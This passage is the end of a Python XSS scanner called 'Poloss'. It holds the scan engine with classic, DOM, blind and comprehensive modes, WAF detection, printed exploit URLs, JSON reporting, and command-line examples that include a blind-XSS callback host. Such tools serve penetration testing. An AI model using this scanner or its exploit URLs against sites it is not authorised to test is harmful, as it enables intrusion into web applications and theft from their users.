                            'handler': attr,
                            'confidence': 'high'
                        }
                        vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    # ==============================
    # 9. MAIN SCANNING ENGINE
    # ==============================
    
    def scan(self):
        """Main scanning function"""
        start_time = time.time()
        
        try:
            # Display banner
            self.print_banner()
            
            # Step 1: Parameter Mining
            parameters = self.mine_parameters()
            
            if not any(len(params) > 0 for params in parameters.values()):
                print(f"{Fore.RED}[!] No parameters found to test{Fore.RESET}")
                return
            
            # Step 2: WAF Detection
            self.detect_waf()
            
            # Step 3: Prepare parameters for testing
            all_params = []
            for param_type, params in self.discovered_params.items():
                all_params.extend(params)
            
            print(f"\n{Fore.GREEN}[*] Starting XSS Scan{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
            
            # Step 4: Run tests based on mode
            test_mode = self.options.get('mode', 'comprehensive')
            
            if test_mode == 'fast':
                # Fast mode - only test URL and form parameters
                test_params = [p for p in all_params if p.get('type') in ['url', 'form']]
                self.concurrent_testing(test_params[:20], 'classic')  # Limit to 20 params
                
            elif test_mode == 'dom':
                # DOM-focused mode
                test_params = all_params
                self.concurrent_testing(test_params, 'dom')
                
            elif test_mode == 'blind':
                # Blind XSS mode
                if not self.blind_callback_url:
                    print(f"{Fore.YELLOW}[!] Blind mode requires callback URL{Fore.RESET}")
                    return
                
                test_params = all_params
                self.concurrent_testing(test_params, 'blind')
                
            else:  # comprehensive mode
                # Test all parameters with all modes
                test_params = all_params
                
                # Classic XSS
                print(f"\n{Fore.GREEN}[*] Testing Classic XSS{Fore.RESET}")
                classic_vulns = self.concurrent_testing(test_params, 'classic')
                self.vulnerabilities.extend(classic_vulns)
                
                # DOM-based XSS
                print(f"\n{Fore.GREEN}[*] Testing DOM-based XSS{Fore.RESET}")
                dom_vulns = self.concurrent_testing(test_params, 'dom')
                self.vulnerabilities.extend(dom_vulns)
                
                # Blind XSS (if callback URL provided)
                if self.blind_callback_url:
                    print(f"\n{Fore.GREEN}[*] Testing Blind XSS{Fore.RESET}")
                    blind_vulns = self.concurrent_testing(test_params, 'blind')
                    self.vulnerabilities.extend(blind_vulns)
            
            # Calculate elapsed time
            self.stats['time_elapsed'] = time.time() - start_time
            
            # Generate final report
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user{Fore.RESET}")
            self.generate_report()
        except Exception as e:
            print(f"\n{Fore.RED}[!] Scan failed: {e}{Fore.RESET}")
            import traceback
            traceback.print_exc()
    
    # ==============================
    # 10. REPORTING & OUTPUT
    # ==============================
    
    def create_vulnerability_record(self, param_info, payload, context, response):
        """Create vulnerability record"""
        return {
            'type': 'XSS',
            'parameter': param_info,
            'payload': payload,
            'context': context,
            'url': response.url,
            'response_code': response.status_code,
            'confidence': 'high',
            'timestamp': time.time(),
            'waf': self.waf_detected
        }
    
    def display_vulnerability(self, vulnerability):
        """Display discovered vulnerability"""
        print(f"\n{Fore.RED}{'!'*60}{Fore.RESET}")
        print(f"{Fore.RED}[!] XSS VULNERABILITY FOUND{Fore.RESET}")
        print(f"{Fore.RED}{'!'*60}{Fore.RESET}")
        
        param_info = vulnerability['parameter']
        print(f"  Parameter: {Fore.CYAN}{param_info['name']}{Fore.RESET} ({param_info.get('type', 'unknown')})")
        print(f"  Payload: {Fore.YELLOW}{vulnerability['payload'][:100]}...{Fore.RESET}")
        print(f"  Context: {vulnerability['context']['context']}")
        print(f"  Confidence: {vulnerability.get('confidence', 'medium')}")
        
        if vulnerability.get('waf'):
            print(f"  WAF: {vulnerability['waf']}")
        
        # Show exploit example
        print(f"\n  {Fore.GREEN}[*] Exploit Example:{Fore.RESET}")
        
        if param_info.get('type') in ['url', 'query']:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            params[param_info['name']] = [vulnerability['payload']]
            new_query = urlencode(params, doseq=True)
            exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            print(f"    GET {exploit_url}")
        
        print(f"{Fore.RED}{'='*60}{Fore.RESET}\n")
        
        # Add to vulnerabilities list
        self.vulnerabilities.append(vulnerability)
        self.stats['vulnerabilities_found'] += 1
    
    def generate_report(self):
        """Generate final scan report"""
        print(f"\n{Fore.GREEN}{'='*80}{Fore.RESET}")
        print(f"{Fore.GREEN}                      SCAN COMPLETED                      {Fore.RESET}")
        print(f"{Fore.GREEN}{'='*80}{Fore.RESET}")
        
        # Statistics
        print(f"\n{Fore.CYAN}[*] SCAN STATISTICS{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
        print(f"  Time Elapsed: {self.stats['time_elapsed']:.2f} seconds")
        print(f"  Requests Sent: {self.stats['requests_sent']}")
        print(f"  Parameters Tested: {self.stats['parameters_tested']}")
        print(f"  WAF Blocks Detected: {self.stats['waf_blocks']}")
        print(f"  Vulnerabilities Found: {Fore.GREEN}{self.stats['vulnerabilities_found']}{Fore.RESET}")
        
        # Summary of findings
        if self.vulnerabilities:
            print(f"\n{Fore.CYAN}[*] VULNERABILITY SUMMARY{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                param_info = vuln['parameter']
                print(f"  {i}. {param_info['name']} ({param_info.get('type')})")
                print(f"     Payload: {vuln['payload'][:50]}...")
                print(f"     Context: {vuln['context']['context']}")
                print(f"     Confidence: {vuln.get('confidence', 'medium')}")
                
                if i < len(self.vulnerabilities):
                    print()
        
        # Recommendations
        print(f"\n{Fore.CYAN}[*] RECOMMENDATIONS{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
        
        if self.vulnerabilities:
            print("  ✓ Implement proper input validation")
            print("  ✓ Use context-aware output encoding")
            print("  ✓ Implement Content Security Policy (CSP)")
            print("  ✓ Use frameworks with built-in XSS protection")
        else:
            print("  ✓ No vulnerabilities found - good security posture!")
            print("  ✓ Continue regular security testing")
        
        # Save report to file
        self.save_report_to_file()
    
    def save_report_to_file(self):
        """Save detailed report to file"""
        report_data = {
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'statistics': self.stats,
            'waf_detected': self.waf_detected,
            'vulnerabilities': self.vulnerabilities,
            'parameters_tested': sum(len(p) for p in self.discovered_params.values())
        }
        
        filename = f"xss_scan_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
        
        print(f"\n{Fore.GREEN}[+] Detailed report saved to: {filename}{Fore.RESET}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Poloss - Advanced XSS Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://example.com/page.php?id=1
  %(prog)s -u http://example.com -m fast -t 20 -d 0.05
  %(prog)s -u http://example.com -m blind -c http://your-callback.com
  %(prog)s -u http://example.com -H "Cookie: session=abc123" --crawl
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--mode', default='comprehensive',
                       choices=['fast', 'comprehensive', 'dom', 'blind'],
                       help='Scanning mode')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of concurrent threads')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                       help='Delay between requests (seconds)')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                       help='Request timeout (seconds)')
    parser.add_argument('-c', '--callback', help='Callback URL for blind XSS')
    parser.add_argument('-H', '--headers', help='Custom headers (format: "Header1:Value1,Header2:Value2")')
    parser.add_argument('--crawl', action='store_true', help='Enable crawling')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Parse custom headers
    custom_headers = {}
    if args.headers:
        for header in args.headers.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                custom_headers[key.strip()] = value.strip()
    
    # Build options dictionary
    options = {
        'mode': args.mode,
        'threads': args.threads,
        'delay': args.delay,
        'timeout': args.timeout,
        'crawl': args.crawl,
        'verbose': args.verbose,
        'blind_callback': args.callback
    }
    
    # Initialize and run scanner
    scanner = AdvancedXSSFuzzer(args.url, options)
    
    # Add custom headers to session
    if custom_headers:
        scanner.session.headers.update(custom_headers)
    
    # Run scan
    scanner.scan()


if __name__ == '__main__':
    main()
